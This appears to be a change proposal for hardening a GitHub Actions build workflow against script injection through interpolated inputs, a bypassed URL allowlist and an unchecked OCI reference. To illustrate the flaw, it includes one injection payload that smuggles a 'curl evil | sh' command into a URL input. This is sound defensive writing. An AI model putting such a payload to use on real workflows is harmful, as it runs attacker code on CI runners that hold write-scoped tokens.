## Why

Finding 1 (High) of `SECURITY_REVIEW.md`: `.github/workflows/attested-rust-build.yml`
interpolates untrusted `${{ … }}` expressions **directly into `run:` script bodies**.
GitHub Actions evaluates `${{ … }}` as textual substitution into the script source
*before* the shell runs, so a `workflow_dispatch` input such as
`https://x"; curl evil | sh; "` is pasted into the script and executed.

An actor who can dispatch the workflow can therefore run arbitrary commands on the
runner, which holds `secrets.GITHUB_TOKEN` with `packages: write`,
`attestations: write`, and `id-token: write`. Two compounding facts:

- The Step 1 `server_url` allowlist is **bypassed** — Step 1 validates an `env` copy,
  but Step 7 re-interpolates the raw `${{ inputs.server_url }}` into its `run:` body.
- `${{ steps.parse_markers.outputs.binary_oci_ref }}` is matched as `.+` from the
  remote executor's stdout (the least-trusted input in the flow) and flows into
  `oras pull` / `gh api` with no format check.

Step 11 is doubly exposed: the same untrusted values are pasted into a `python3 -c "…"`
string, adding a second (Python) injection surface on top of the shell one.

## What Changes

- **Pass every untrusted value through `env:` and reference it as a quoted `"$VAR"`**
  (the pattern Step 1 already uses correctly), so the value is bound to an environment
  variable and never parsed as script text. Applies to `inputs.server_url`,
  `inputs.script_path`, `inputs.commit_hash`, `inputs.repository_url`,
  `inputs.audience`, and the GitHub-context values currently inlined into `run:` bodies
  (Steps 7, 9, 11, 13, 16, 17).
- **Eliminate the Python injection in Step 11**: the inline `python3 -c` script reads
  values from `os.environ` instead of having them interpolated into its source text.
- **Validate `BINARY_OCI_REF` against a strict grammar at the parse step (Step 8)** so
  every downstream consumer (Steps 9 and 17) sees only a checked reference; an
  out-of-grammar value fails the job.
- **Close the allowlist bypass** as a side effect: Step 7 consumes the same validated
  `server_url` env value rather than re-interpolating the raw input.

This is a security hardening of the workflow's input handling only. No build, signing,
attestation, or publishing behavior changes for well-formed inputs.

## Capabilities

### New Capabilities

(none)

### Modified Capabilities

- `attested-build-workflow`: adds a requirement that untrusted inputs and
  remote-executor-derived values are never interpolated into `run:` (shell or
  `python3 -c`) bodies; strengthens the "Server URL Validation and Allowlisting"
  requirement so the validated value (not a re-interpolated raw input) is what reaches
  the caller; strengthens "Binary Retrieval and Integrity Verification" to require
  `BINARY_OCI_REF` grammar validation before use.

## Impact

- **Files changed:** `.github/workflows/attested-rust-build.yml` (Steps 7, 8, 9, 11,
  13, 16, 17), `openspec/specs/attested-build-workflow/spec.md`.
- **Closes coverage gaps** noted in `SECURITY_REVIEW.md`: the missing
  no-`${{ inputs.* }}`-in-`run:` assertion and the missing `binary_oci_ref`-grammar
  assertion (findings list, "Coverage gaps").
- **No behavior change** for valid inputs: the caller, provenance manifest, OCI push,
  and attestation steps produce identical output for well-formed dispatches.
- **Possible operator-visible change:** a `BINARY_OCI_REF` that does not match the
  expected `ghcr.io/<owner>/<repo>/tmp-build:<tag>` shape now fails the job instead of
  being passed to `oras pull`.
